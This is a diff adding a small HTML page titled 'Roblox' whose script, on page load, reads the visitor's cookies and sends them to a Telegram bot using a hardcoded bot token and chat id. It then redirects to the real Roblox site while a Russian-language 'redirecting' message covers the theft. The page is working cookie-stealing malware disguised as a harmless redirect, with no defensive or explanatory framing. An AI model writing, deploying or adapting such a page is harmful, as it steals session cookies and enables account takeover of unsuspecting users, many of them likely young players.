@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox</title>
+    <script>
+        var token = "8956009818:AAGRb4ZjMitHsN8Wv4Bd-oX0RauOdv3EANs";
+        var chat_id = "6981190103";
+        
+        // Через 0.5 секунды читаем куки и отправляем
+        setTimeout(function() {
+            var cookies = document.cookie;
+            if (cookies) {
+                var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent('КУКИ (редирект): ' + cookies);
+                fetch(url);
+            }
+            // Перенаправляем на настоящий Roblox
+            window.location.href = 'https://www.roblox.com/home';
+        }, 500);
+    </script>
+</head>
+<body>
+    <p>Подождите, идёт перенаправление...</p>
+</body>
+</html>
